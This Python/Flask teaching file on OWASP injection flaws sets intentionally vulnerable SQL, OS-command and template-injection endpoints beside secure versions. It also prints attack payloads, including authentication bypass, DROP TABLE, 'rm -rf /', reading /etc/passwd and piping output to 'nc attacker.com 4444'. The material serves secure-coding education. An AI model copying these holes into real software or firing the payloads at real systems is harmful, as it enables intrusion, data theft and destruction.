"""
OWASP A03:2021 - Injection
============================

Injection flaws occur when untrusted data is sent to an interpreter as part of
a command or query. The attacker's hostile data can trick the interpreter into
executing unintended commands or accessing data without proper authorization.

Common types:
- SQL Injection
- NoSQL Injection
- OS Command Injection
- LDAP Injection
- XML Injection (XXE)
- Server-Side Template Injection (SSTI)
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3
import subprocess
import os
import json

app = Flask(__name__)

# ============================================================================
# VULNERABLE CODE - SQL INJECTION
# ===========================================================================+

# Example 1: Classic SQL Injection in Login
@app.route('/api/login_vulnerable', methods=['POST'])
def login_sql_injection():
    """
    VULNERABILITY: SQL Injection via string concatenation
    
    Attack: username = "admin' OR '1'='1' --"
    Result: Bypasses authentication
    """
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # String concatenation - SQL INJECTION!
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    
    print(f"Executing query: {query}")
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        return jsonify({'message': 'Login successful', 'user': user[1]})
    return jsonify({'error': 'Invalid credentials'}), 401


# Example 2: SQL Injection in Search
@app.route('/api/search_vulnerable')
def search_sql_injection():
    """
    VULNERABILITY: SQL Injection in search functionality
    
    Attack: ?q=' UNION SELECT username, password_hash FROM users--
    Result: Dumps all usernames and password hashes
    """
    search_term = request.args.get('q', '')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Vulnerable query with LIKE
    query = f"SELECT id, username, email FROM users WHERE username LIKE '%{search_term}%'"
    
    cursor.execute(query)
    results = cursor.fetchall()
    
    return jsonify({'results': results})


# Example 3: SQL Injection with Data Modification
@app.route('/api/user/update_email_vulnerable', methods=['POST'])
def update_email_sql_injection():
    """
    VULNERABILITY: SQL Injection allows data modification
    
    Attack: email = "'; DROP TABLE users; --"
    Result: Deletes entire users table
    """
    user_id = request.args.get('user_id')
    new_email = request.form.get('email')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Vulnerable UPDATE query
    query = f"UPDATE users SET email = '{new_email}' WHERE id = {user_id}"
    
    cursor.execute(query)
    conn.commit()
    
    return jsonify({'message': 'Email updated'})


# ============================================================================
# VULNERABLE CODE - OS COMMAND INJECTION
# ============================================================================

# Example 4: OS Command Injection in Ping
@app.route('/api/ping_vulnerable')
def ping_command_injection():
    """
    VULNERABILITY: OS Command Injection
    
    Attack: ?host=google.com; cat /etc/passwd
    Result: Executes arbitrary commands on server
    """
    host = request.args.get('host', 'localhost')
    
    # Using shell=True with user input - COMMAND INJECTION!
    command = f"ping -c 4 {host}"
    
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    return jsonify({
        'command': command,
        'output': result.stdout,
        'error': result.stderr
    })


# Example 5: Command Injection in File Operations
@app.route('/api/file/compress_vulnerable', methods=['POST'])
def compress_file_command_injection():
    """
    VULNERABILITY: Command Injection in file compression
    
    Attack: filename = "file.txt; rm -rf /"
    Result: Deletes all files on server
    """
    filename = request.form.get('filename')
    
    # Dangerous shell command with user input
    command = f"tar -czf {filename}.tar.gz {filename}"
    
    subprocess.run(command, shell=True)
    
    return jsonify({'message': 'File compressed'})


# ============================================================================
# VULNERABLE CODE - TEMPLATE INJECTION
# ============================================================================

# Example 6: Server-Side Template Injection (SSTI)
@app.route('/api/greet_vulnerable')
def ssti_vulnerability():
    """
    VULNERABILITY: Server-Side Template Injection
    
    Attack: ?name={{7*7}}
    Result: Template engine evaluates expressions (returns 49)
    
    Advanced attack: ?name={{config}}
    Result: Exposes Flask configuration including secrets
    """
    name = request.args.get('name', 'Guest')
    
    # Rendering user input as template - SSTI!
    template = f"<h1>Hello {name}!</h1>"
    
    return render_template_string(template)


# ============================================================================
# SECURE CODE - PARAMETERIZED QUERIES
# ============================================================================

# Example 1: SECURE - Parameterized Query for Login
@app.route('/api/login_secure', methods=['POST'])
def login_secure():
    """
    SECURE: Using parameterized queries
    
    Defense: SQL and data are separated, no injection possible
    """
    import bcrypt
    
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Parameterized query - SECURE!
    query = "SELECT id, username, password_hash FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    
    if user and bcrypt.checkpw(password.encode(), user[2]):
        return jsonify({'message': 'Login successful', 'username': user[1]})
    
    return jsonify({'error': 'Invalid credentials'}), 401


# Example 2: SECURE - Parameterized Search Query
@app.route('/api/search_secure')
def search_secure():
    """
    SECURE: Using parameterized query for search
    
    Defense: User input cannot break out of data context
    """
    search_term = request.args.get('q', '')
    
    # Input validation
    if len(search_term) > 50:
        return jsonify({'error': 'Search term too long'}), 400
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Parameterized query with LIKE
    query = "SELECT id, username, email FROM users WHERE username LIKE ?"
    cursor.execute(query, (f"%{search_term}%",))
    results = cursor.fetchall()
    
    return jsonify({'results': [
        {'id': r[0], 'username': r[1], 'email': r[2]} for r in results
    ]})


# Example 3: SECURE - Using ORM (SQLAlchemy)
"""
SECURE: Using ORM instead of raw SQL

from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String)
    email = Column(String)

engine = create_engine('sqlite:///users.db')
Session = sessionmaker(bind=engine)

@app.route('/api/user/<int:user_id>/secure')
def get_user_orm(user_id):
    session = Session()
    # ORM handles parameterization automatically
    user = session.query(User).filter(User.id == user_id).first()
    
    if user:
        return jsonify({
            'id': user.id,
            'username': user.username,
            'email': user.email
        })
    return jsonify({'error': 'User not found'}), 404
"""


# ============================================================================
# SECURE CODE - COMMAND INJECTION PREVENTION
# ============================================================================

# Example 4: SECURE - Command Injection Prevention
@app.route('/api/ping_secure')
def ping_secure():
    """
    SECURE: Validate input, use subprocess without shell
    
    Defense: 
    1. Whitelist allowed hosts
    2. Validate input format
    3. Use subprocess with array (no shell)
    """
    import re
    
    host = request.args.get('host', 'localhost')
    
    # Input validation - only allow valid hostnames/IPs
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        return jsonify({'error': 'Invalid host format'}), 400
    
    # Optional: Whitelist of allowed hosts
    ALLOWED_HOSTS = ['localhost', '127.0.0.1', 'google.com']
    if host not in ALLOWED_HOSTS:
        return jsonify({'error': 'Host not allowed'}), 403
    
    try:
        # Use array, NOT shell=True - SECURE!
        result = subprocess.run(
            ['ping', '-c', '4', host],  # Array, not string
            capture_output=True,
            text=True,
            timeout=10  # Prevent hanging
        )
        
        return jsonify({
            'host': host,
            'output': result.stdout,
            'returncode': result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timeout'}), 500


# Example 5: SECURE - File Operations Without Command Injection
@app.route('/api/file/compress_secure', methods=['POST'])
def compress_file_secure():
    """
    SECURE: Use Python libraries instead of shell commands
    
    Defense: Native Python tarfile module, no shell involved
    """
    import tarfile
    from werkzeug.utils import secure_filename
    
    filename = request.form.get('filename')
    
    # Sanitize filename
    safe_filename = secure_filename(filename)
    
    if not safe_filename:
        return jsonify({'error': 'Invalid filename'}), 400
    
    # Check file exists
    file_path = os.path.join('/uploads', safe_filename)
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    # Use Python's tarfile module - no shell commands!
    archive_path = f"{file_path}.tar.gz"
    
    try:
        with tarfile.open(archive_path, "w:gz") as tar:
            tar.add(file_path, arcname=safe_filename)
        
        return jsonify({
            'message': 'File compressed successfully',
            'archive': f"{safe_filename}.tar.gz"
        })
    except Exception as e:
        return jsonify({'error': 'Compression failed'}), 500


# ============================================================================
# SECURE CODE - TEMPLATE INJECTION PREVENTION
# ============================================================================

# Example 6: SECURE - Prevent Template Injection
@app.route('/api/greet_secure')
def greet_secure():
    """
    SECURE: Escape user input, don't render as template
    
    Defense: Treat user input as data, not code
    """
    from markupsafe import escape
    
    name = request.args.get('name', 'Guest')
    
    # Escape user input - prevent code execution
    safe_name = escape(name)
    
    # Use variable substitution, not template rendering
    html = f"<h1>Hello {safe_name}!</h1>"
    
    return html


# Alternative: Use proper template with autoescaping
"""
# In template file (greet.html):
<h1>Hello {{ name }}!</h1>

# In route:
from flask import render_template

@app.route('/greet_safe')
def greet_safe():
    name = request.args.get('name', 'Guest')
    # Jinja2 autoescapes by default
    return render_template('greet.html', name=name)
"""


# ============================================================================
# ATTACK DEMONSTRATIONS
# ============================================================================

def demonstrate_sql_injection():
    """Demonstrate SQL Injection attacks"""
    print("\n=== SQL Injection Attack Demonstrations ===\n")
    
    print("1. Authentication Bypass")
    print("   Payload: username = \"admin' OR '1'='1' --\"")
    print("   Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''")
    print("   Result: ✗ Bypasses authentication (always true)\n")
    
    print("2. Data Exfiltration (UNION)")
    print("   Payload: ?q=' UNION SELECT username, password_hash FROM users--")
    print("   Result: ✗ Dumps all usernames and password hashes\n")
    
    print("3. Blind SQL Injection (Time-based)")
    print("   Payload: ?id=1' AND SLEEP(5) --")
    print("   Result: ✗ If page loads slowly, injection confirmed\n")
    
    print("4. Data Destruction")
    print("   Payload: email = \"'; DROP TABLE users; --\"")
    print("   Result: ✗ Deletes entire users table\n")


def demonstrate_command_injection():
    """Demonstrate OS Command Injection attacks"""
    print("\n=== Command Injection Attack Demonstrations ===\n")
    
    print("1. Command Chaining")
    print("   Payload: ?host=google.com; cat /etc/passwd")
    print("   Result: ✗ Executes both ping and cat commands\n")
    
    print("2. Command Substitution")
    print("   Payload: ?host=google.com`whoami`")
    print("   Result: ✗ Executes whoami and uses output\n")
    
    print("3. Piping")
    print("   Payload: ?host=google.com | nc attacker.com 4444")
    print("   Result: ✗ Pipes output to attacker's server\n")


# ============================================================================
# PREVENTION BEST PRACTICES
# ============================================================================

"""
INJECTION PREVENTION BEST PRACTICES:

SQL Injection:
✅ Use parameterized queries (prepared statements)
✅ Use ORM (SQLAlchemy, Django ORM)
✅ Validate and sanitize all inputs
✅ Use least privilege database accounts
✅ Escape special characters if queries must be dynamic
✅ Use stored procedures (with parameterization)
✅ Implement input validation (whitelist)

Command Injection:
✅ Avoid system calls with user input
✅ Use subprocess with array (not shell=True)
✅ Validate input against whitelist
✅ Use native Python libraries instead of shell commands
✅ Implement strict input validation
✅ Run with minimal privileges
✅ Use sandboxing/containers

Template Injection:
✅ Never pass user input to template engine
✅ Use autoescaping templates
✅ Separate data from code
✅ Use markupsafe.escape()
✅ Validate input before rendering

General:
✅ Principle of least privilege
✅ Input validation (whitelist > blacklist)
✅ Output encoding
✅ Use safe APIs
✅ Regular security testing
✅ Code review focusing on injection points

CODE CHECKLIST:

✅ All SQL uses parameterized queries
✅ No string concatenation in queries
✅ subprocess uses array, not shell=True
✅ Input validation on all user inputs
✅ Use ORM where possible
✅ Templates don't render user input as code
✅ Escape special characters in output
✅ Database accounts have minimal privileges
✅ Security testing includes injection tests
✅ Regular dependency updates
"""

# ============================================================================
# REAL-WORLD EXAMPLES
# ============================================================================

"""
REAL-WORLD INJECTION ATTACKS:

1. TalkTalk (2015)
   - SQL Injection in website
   - 157,000 customers affected
   - £400,000 fine + £77 million costs
   - Customer data stolen

2. Sony Pictures (2011)
   - SQL Injection vulnerability
   - 1 million accounts compromised
   - Passwords, email addresses stolen
   - Major reputation damage

3. Heartland Payment Systems (2008)
   - SQL Injection attack
   - 134 million credit cards exposed
   - $140 million in costs
   - Led to bankruptcy of some businesses

4. GitHub (2020)
   - Blind SQL Injection in GitHub.com
   - $10,000 bug bounty paid
   - No data breach (caught early)
   - Shows even big companies vulnerable

5. Yahoo (2012)
   - SQL Injection by hacktivist group
   - 450,000 credentials leaked
   - Passwords stored in plaintext
   - Led to class action lawsuit

KEY LESSONS:
- SQL Injection still #3 most critical vulnerability
- Always use parameterized queries
- Input validation is essential
- Regular security testing crucial
- Defense in depth (multiple layers)
"""

# ============================================================================
# TESTING
# ============================================================================

def test_sql_injection_detection():
    """Test if code is vulnerable to SQL Injection"""
    print("\n=== Testing for SQL Injection ===")
    
    test_payloads = [
        "admin' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users; --",
        "' AND 1=2 UNION SELECT password FROM users--"
    ]
    
    print("Testing with common SQL injection payloads:")
    for payload in test_payloads:
        print(f"  Payload: {payload}")
    
    print("\n✅ Vulnerable endpoint will execute these")
    print("✅ Secure endpoint will treat as literal strings")


if __name__ == '__main__':
    print("OWASP A03:2021 - Injection Examples")
    print("=" * 60)
    print("\nThis file demonstrates:")
    print("- SQL Injection (authentication bypass, data exfiltration)")
    print("- OS Command Injection")
    print("- Server-Side Template Injection (SSTI)")
    print("- Secure alternatives with parameterized queries")
    
    demonstrate_sql_injection()
    demonstrate_command_injection()
    test_sql_injection_detection()
    
    print("\n" + "=" * 60)
    print("Key Takeaway: NEVER concatenate user input into queries/commands!")
    print("Always use parameterized queries and input validation.")

